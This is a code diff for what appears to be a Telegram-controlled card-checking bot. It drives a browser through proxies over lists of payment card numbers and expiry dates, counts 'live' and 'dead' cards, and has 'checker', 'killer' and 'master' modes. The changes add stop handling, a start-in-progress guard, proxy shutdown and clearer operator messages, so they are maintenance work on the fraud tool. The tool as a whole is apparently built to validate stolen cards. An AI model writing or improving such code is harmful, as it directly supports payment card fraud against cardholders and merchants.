@@ -34,6 +34,7 @@ BOT_STATE = {
     "current_card": "",
     "stats": {"live": 0, "dead": 0, "error": 0, "hits": 0},
     "chat_id": None,
+    "starting": False,
 }
 
 
@@ -1440,9 +1441,17 @@ def run_attack(mode_name: str):
         try:
             with sync_playwright() as p:
                 for idx, (payment_num, exp_date, serial_num, raw_line) in enumerate(records, start=1):
+                    if BOT_STATE.get("stop_requested"):
+                        print_stage("STOP", "INFO", "stop_requested — ending batch")
+                        nonlocal_data["stop"] = True
+                        return nonlocal_data
                     print(f"\n{BOLD}{rgb(255,200,0)}[{idx}/{len(records)}] CARD: {raw_line}{RESET}")
 
                     for hit in range(1, CONFIG["hits_per_card"] + 1):
+                        if BOT_STATE.get("stop_requested"):
+                            print_stage("STOP", "INFO", "stop_requested — ending hits")
+                            nonlocal_data["stop"] = True
+                            return nonlocal_data
                         proxy_str = "none"
                         if proxies:
                             attempts = 0
@@ -1482,6 +1491,11 @@ def run_attack(mode_name: str):
                         status = "error"
 
                         for attempt in range(CONFIG["retry_on_error"] + 1):
+                            if BOT_STATE.get("stop_requested"):
+                                result = "[Stopped]"
+                                status = "error"
+                                nonlocal_data["stop"] = True
+                                break
                             try:
                                 proxy_config = None
                                 if proxy_str != "none":
@@ -1669,7 +1683,8 @@ def run_attack(mode_name: str):
             cleanup_batch_files()
             print(f"\n{rgb(0,255,170)}[MASTER] Batch {batch_num} done | batch live={stats['live']} | total live={count_live_cards()}{RESET}")
 
-            if stats.get("stop"):
+            if stats.get("stop") or BOT_STATE.get("stop_requested"):
+                print(f"{rgb(255,200,0)}[MASTER] Stop requested — ending all batches{RESET}")
                 break
             if just_need and count_live_cards() >= min_live:
                 print(f"{rgb(0,255,170)}[MASTER] Target live reached ({count_live_cards()}/{min_live}) — stopping{RESET}")
@@ -2022,7 +2037,12 @@ def start_telegram_bot_background():
         if not await guard(update):
             return
         if BOT_STATE["running"]:
-            await update.message.reply_text("⚠️ Already running. /stop first.")
+            await update.message.reply_text(
+                "⚠️ Already running.\nSend /stop and wait for \"Run finished\", then /run again."
+            )
+            return
+        if BOT_STATE.get("starting"):
+            await update.message.reply_text("⏳ Start already in progress...")
             return
         if not context.args or context.args[0].lower() not in ("checker", "killer", "master"):
             await update.message.reply_text("Usage: /run checker | killer | master")
@@ -2031,17 +2051,20 @@ def start_telegram_bot_background():
         BOT_STATE["stop_requested"] = False
         BOT_STATE["mode"] = mode
         BOT_STATE["stats"] = {"live": 0, "dead": 0, "error": 0, "hits": 0}
+        BOT_STATE["starting"] = True
         if mode == "killer":
             CONFIG["base_url"] = CONFIG["killer_url"]
             CONFIG["hits_per_card"] = CONFIG["killer_hits_per_card"]
         CONFIG["mode"] = mode
         await update.message.reply_text(
-            f"🚀 Starting *{mode.upper()}*...\nUse /analytics to monitor.",
+            f"🚀 Starting *{mode.upper()}*...\nUse /analytics to monitor. /stop to halt.",
             parse_mode="Markdown",
         )
 
         def worker():
             BOT_STATE["running"] = True
+            BOT_STATE["starting"] = False
+            BOT_STATE["stop_requested"] = False
             try:
                 run_attack(mode)
             except Exception as e:
@@ -2049,16 +2072,30 @@ def start_telegram_bot_background():
                 telegram_notify(f"❌ Run error: {e}")
             finally:
                 BOT_STATE["running"] = False
+                BOT_STATE["starting"] = False
+                BOT_STATE["stop_requested"] = False
                 BOT_STATE["current_card"] = ""
+                try:
+                    proxy_mgr.stop()
+                except Exception:
+                    pass
                 telegram_notify("✅ Run finished\n\n" + _analytics_text().replace("*", "").replace("`", ""))
 
-        threading.Thread(target=worker, daemon=True).start()
+        threading.Thread(target=worker, daemon=True, name=f"run-{mode}").start()
 
     async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await guard(update):
             return
+        if not BOT_STATE.get("running"):
+            BOT_STATE["stop_requested"] = False
+            await update.message.reply_text("Nothing is running right now.")
+            return
         BOT_STATE["stop_requested"] = True
-        await update.message.reply_text("⏹ Stop requested — will halt after current card.")
+        await update.message.reply_text(
+            "⏹ Stop requested.\n"
+            "Finishing current card, then stopping.\n"
+            "Wait for \"Run finished\" before /run again."
+        )
 
     async def cmd_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await guard(update):
